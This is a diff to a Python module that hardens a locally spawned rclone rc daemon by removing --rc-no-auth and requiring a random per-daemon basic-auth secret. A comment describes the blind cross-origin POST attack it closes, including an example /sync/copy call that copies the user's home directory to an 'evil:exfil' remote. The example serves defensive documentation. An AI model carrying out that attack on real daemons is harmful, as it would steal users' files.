@@ -12,7 +12,10 @@ over its local HTTP API (mount/mount, mount/unmount, mount/listmounts) —
 one cross-platform mount API instead of per-OS umount commands. The daemon
 is spawned with its {port, pid} recorded in home_dir()/rcd.json and reused
 across server runs (the spawn-or-reuse pattern of the tile-server daemons,
-templates/geotiff/tile_server.py). Unmount is an explicit user action.
+templates/geotiff/tile_server.py). It requires basic auth with a random
+per-daemon secret, recorded alongside port/pid — see the _rcd_auth block;
+loopback is not a boundary against the browser. Unmount is an explicit user
+action.
 
 Whether the daemon (and its mounts) survives the server dying depends on
 FUSED_RENDER_RCLONE_PERSIST (see _rclone_should_persist). In DEV (dev.sh sets
@@ -26,6 +29,7 @@ rcd.json stale and respawns.
 Store: home_dir()/mounts.json, whole-file last-write-wins like
 shell/bookmarks.py. Same acyclic-router + X-Fused-guard conventions.
 """
+import base64
 import collections
 import configparser
 import email.utils
@@ -34,6 +38,7 @@ import json
 import logging
 import os
 import re
+import secrets
 import shutil
 import signal
 import socket
@@ -416,6 +421,79 @@ def _rcd_state_path() -> str:
     return os.path.join(storage.home_dir(), "rcd.json")
 
 
+# ------------------------------------------------------------ rcd rc auth
+#
+# The rc daemon MUST require authentication. It was previously spawned with
+# --rc-no-auth, which made it a fully unauthenticated HTTP API on loopback —
+# and the loopback bind is not a boundary against the browser: any page the
+# user has open can POST to http://127.0.0.1:<port>/... The reply is
+# unreadable cross-origin (rclone sends no CORS headers), but rclone merges
+# URL query parameters into the rc call's arguments, so a CORS-SIMPLE request
+# with no preflight — POST, text/plain, no custom headers — is enough to drive
+# it blind: /sync/copy?srcFs=/Users/you&dstFs=evil:exfil, or /core/command,
+# which exposes the whole rclone CLI. The random port is not a secret a
+# 16-bit spray can't find. This is exactly the threat the tile-daemon token
+# (D122, SECURITY.md) exists to close, and rcd — with a far bigger API —
+# had no equivalent.
+#
+# So each daemon mints a random secret at spawn and requires HTTP basic auth,
+# mirroring D122. The secret is passed to the child through the ENVIRONMENT
+# (RCLONE_RC_USER/RCLONE_RC_PASS), never on argv, so it does not show up in
+# `ps` for other local users. It is recorded alongside {port, pid} in
+# rcd.json — and in the central registry, so reap_stale_rcd can still probe
+# core/pid on a daemon whose own home dir is gone — which puts it at the same
+# privacy level as the tile-daemon token: only as private as the local
+# filesystem, which the trust model already concedes.
+#
+# Back-compat: a daemon recorded WITHOUT a secret (spawned by an older build,
+# still alive across an upgrade) is called without an Authorization header, so
+# it keeps working until it is replaced.
+_RCD_RC_USER = "fused-render"
+
+_rcd_auth_lock = threading.Lock()
+_rcd_auth_cache: dict[int, tuple[str, str]] = {}
+
+
+def _rcd_auth(port: int) -> tuple[str, str] | None:
+    """The (user, pass) recorded for the daemon on `port`, or None when it has
+    none on record (pre-auth daemon, or state not written yet).
+
+    Checked against rcd.json first, then the central registry — the reaper
+    probes daemons belonging to OTHER homes, whose rcd.json we cannot read.
+    Successful lookups are memoized per port because _rc runs on every
+    rc-routed call; a miss is not cached, so the spawn path (which writes
+    state only after the daemon answers) heals itself on the next call."""
+    with _rcd_auth_lock:
+        hit = _rcd_auth_cache.get(port)
+    if hit is not None:
+        return hit
+    found = None
+    state = storage.read_json(_rcd_state_path())
+    if isinstance(state, dict) and state.get("port") == port and state.get("rc_pass"):
+        found = (state.get("rc_user") or _RCD_RC_USER, state["rc_pass"])
+    else:
+        reg = storage.read_json(_rcd_registry_path())
+        if isinstance(reg, list):
+            for e in reg:
+                if isinstance(e, dict) and e.get("port") == port and e.get("rc_pass"):
+                    found = (e.get("rc_user") or _RCD_RC_USER, e["rc_pass"])
+                    break
+    if found is not None:
+        with _rcd_auth_lock:
+            _rcd_auth_cache[port] = found
+    return found
+
+
+def _forget_rcd_auth(port: int | None = None) -> None:
+    """Drop memoized credentials — for `port` (a fresh daemon may reuse a port
+    with a NEW secret) or, with no argument, entirely."""
+    with _rcd_auth_lock:
+        if port is None:
+            _rcd_auth_cache.clear()
+        else:
+            _rcd_auth_cache.pop(port, None)
+
+
 def _rcd_registry_path() -> str:
     """Path to the central registry of every rcd this machine has spawned,
     one entry per home (state) dir.
@@ -432,7 +510,7 @@ def _rcd_registry_path() -> str:
     return os.path.join(base, "rcd-registry.json")
 
 
-def _register_rcd(pid: int, port: int) -> None:
+def _register_rcd(pid: int, port: int, auth: tuple[str, str] | None = None) -> None:
     """Record a freshly spawned daemon in the central registry, keyed by its
     home dir (a new daemon for the same home replaces the old record). Purely
     additive breadcrumb for reap_stale_rcd — a failure here must never fail a
@@ -442,7 +520,12 @@ def _register_rcd(pid: int, port: int) -> None:
         reg = storage.read_json(_rcd_registry_path())
         entries = [e for e in reg if isinstance(e, dict)] if isinstance(reg, list) else []
         entries = [e for e in entries if e.get("dir") != home]  # dedupe by home
-        entries.append({"pid": pid, "port": port, "dir": home})
+        entry = {"pid": pid, "port": port, "dir": home}
+        if auth:
+            # So a later run can still authenticate core/pid against this
+            # daemon after its home (and rcd.json) is gone — see _rcd_auth.
+            entry["rc_user"], entry["rc_pass"] = auth
+        entries.append(entry)
         storage.write_json(_rcd_registry_path(), entries)
     except OSError:
         logger.warning("rcd registry write failed", exc_info=True)
@@ -611,36 +694,52 @@ def _copytruncate_rcd_log() -> None:
         logger.warning("rcd log copytruncate failed", exc_info=True)
 
 
-def write_rcd_state(port: int, pid: int, log_path: str | None = None) -> None:
+def write_rcd_state(port: int, pid: int, log_path: str | None = None,
+                    auth: tuple[str, str] | None = None) -> None:
     # Record the log path alongside port/pid so tooling (and a human tailing
     # the daemon) can find it without reconstructing home_dir() (INCIDENT).
     # spawner_pid records WHO spawned the daemon: rcd is shared per-home, so a
     # later process reusing it (e.g. the macOS app alongside a CLI server) must
     # be able to tell on quit whether the daemon is its own to stop — see
     # stop_local_rcd's ownership gate.
-    storage.write_json(
-        _rcd_state_path(),
-        {
-            "port": port,
-            "pid": pid,
-            "log": log_path or _rcd_log_path(),
-            "spawner_pid": os.getpid(),
-        },
-    )
+    # rc_user/rc_pass: the daemon's basic-auth secret, so any later process (or
+    # a restarted server) reusing this shared daemon can still call it.
+    state = {
+        "port": port,
+        "pid": pid,
+        "log": log_path or _rcd_log_path(),
+        "spawner_pid": os.getpid(),
+    }
+    if auth:
+        state["rc_user"], state["rc_pass"] = auth
+    storage.write_json(_rcd_state_path(), state)
+    # A new daemon may land on a recycled port with a different secret, so the
+    # memoized credentials for that port must not survive this write.
+    _forget_rcd_auth(port)
     # Also record in the central registry so a future run can reap this daemon
     # even after its home dir (and this rcd.json) is deleted (INCIDENT: leaked
     # rcd daemons outliving pytest runs / deleted worktrees for days).
-    _register_rcd(pid, port)
+    _register_rcd(pid, port, auth)
 
 
-def _rc(port: int, method: str, params: dict | None = None, timeout: float = 30):
+def _rc(port: int, method: str, params: dict | None = None, timeout: float = 30,
+        auth: tuple[str, str] | None = None):
     """One rc call. Returns the decoded JSON on 200; raises RuntimeError with
-    rclone's error message on any failure."""
+    rclone's error message on any failure.
+
+    `auth` is the daemon's basic-auth credential; when omitted it is looked up
+    from the recorded state (_rcd_auth). The spawn path passes it explicitly
+    because it calls core/pid before the state is written."""
     raw = json.dumps(params or {}).encode()
+    headers = {"Content-Type": "application/json"}
+    creds = auth or _rcd_auth(port)
+    if creds:
+        token = base64.b64encode(f"{creds[0]}:{creds[1]}".encode()).decode()
+        headers["Authorization"] = f"Basic {token}"
     req = urllib.request.Request(
         f"http://127.0.0.1:{port}/{method}",
         data=raw,
-        headers={"Content-Type": "application/json"},
+        headers=headers,
         method="POST",
     )
     try:
@@ -900,12 +999,19 @@ def _ensure_rcd_locked() -> int:
     # DEVNULL: --log-file captures everything, and a detached daemon has no
     # console to write to anyway.
     log_path = _rotate_rcd_log()
+    # The rc API requires basic auth (see the _rcd_auth block above): a random
+    # per-daemon secret, handed over in the ENVIRONMENT rather than on argv so
+    # it is not visible in `ps` to other local users. Without it the daemon is
+    # an unauthenticated filesystem API that any page in the user's browser can
+    # drive blind with a no-preflight cross-origin POST.
+    auth = (_RCD_RC_USER, secrets.token_urlsafe(32))
     subprocess.Popen(
-        [bin_, "rcd", "--rc-no-auth", "--use-server-modtime",
+        [bin_, "rcd", "--use-server-modtime",
          f"--rc-addr=127.0.0.1:{port}",
          f"--log-file={log_path}", "--log-level", "INFO"],
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
+        env={**os.environ, "RCLONE_RC_USER": auth[0], "RCLONE_RC_PASS": auth[1]},
         # Dev (FUSED_RENDER_RCLONE_PERSIST set): setsid into its own session so
         # the daemon outlives watchfiles server restarts. Production (unset):
         # stay a normal child so app teardown reaps it (on Linux via the
@@ -916,8 +1022,8 @@ def _ensure_rcd_locked() -> int:
     deadline = time.time() + 10
     while time.time() < deadline:
         try:
-            pid = _rc(port, "core/pid", timeout=2).get("pid", 0)
-            write_rcd_state(port, pid, log_path)
+            pid = _rc(port, "core/pid", timeout=2, auth=auth).get("pid", 0)
+            write_rcd_state(port, pid, log_path, auth)
             return port
         except RuntimeError:
             time.sleep(0.2)
